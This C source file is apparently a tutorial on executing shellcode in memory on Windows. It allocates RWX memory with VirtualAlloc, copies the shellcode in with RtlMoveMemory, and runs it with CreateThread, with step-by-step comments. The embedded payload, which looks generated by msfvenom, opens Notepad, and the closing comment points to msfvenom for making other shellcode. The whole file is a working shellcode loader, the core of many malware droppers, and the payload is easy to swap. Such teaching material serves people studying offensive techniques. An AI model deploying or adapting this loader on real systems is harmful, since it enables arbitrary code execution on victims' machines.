//Executing the Shellcode using windows API.
//Let's load the wanted libraries.
#include <windows.h> //header for windows operations
#include <stdio.h>

//Entry Point
int main()
{
    //Now create wanted variables.
    //This shell code popup notepad in the system.
    //when specify the shellcode make sure to compile the correct architecture.
    char shellcode[] = {
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x6e\x6f\x74\x65\x70\x61\x64\x2e\x65\x78\x65\x00"   
        }; //To specify the generated shell code.
    int shellcode_size = sizeof(shellcode); //To specify the size of the shellcode.

    //Now will create pointer to store the shellcode in the memory (Allocate  Memory). 
    void *exec_mem;

    //Now will print the memory address of the shellcode to debug the program easily
    printf("ShellCode Variable Address : 0x%p\n", shellcode);

    //Now will call virtual alloc function.
    //1st arg - want to specify the memory address of the buffer.
    //2nd arg - size of shellcode.
    //3rd arg - Allcation type.
    //4th arg - Protection type.> for setting priviledges to do.
    exec_mem = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // Allcaate memory in the specific region.


    //Now will print the memory address of the exec_mem variable to debug the program easily.
    printf("Memory address of exec_mem region : 0x%p\n", exec_mem);

    //Can be able set the breakpoint to the program while the excution happens using getchar function.
    getchar();
    //Now let's code Rtlmovememory function > to move the memory to other locaation.
    //Specify Destination
    //Specify the Source
    //Specify the sizeof shellcode
    RtlMoveMemory(exec_mem, shellcode, shellcode_size); //Move the shellcode to the allocated memory region.

    //Let's Start create thread process.
    //1 arg - Security Attributes > 2nd arg - Stacksize > this set to 0 for take the executable file size.
    //3rd arg - Specification of the thread where we need to start the process.
    // LP parameter is set to null. 
    //5th - dwcreation flag is set to 0. >  because the process will immediately start.
    //6th - lpthread ID  set to null.
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL); //Create a thread and execute the code that points to the memory location crated using virtual Alloc function.
    //Sleep for some seconds.
    Sleep(1000);
    return 0;
    //Code finished let's create a shellcode using msfvenom and compile the code.  

}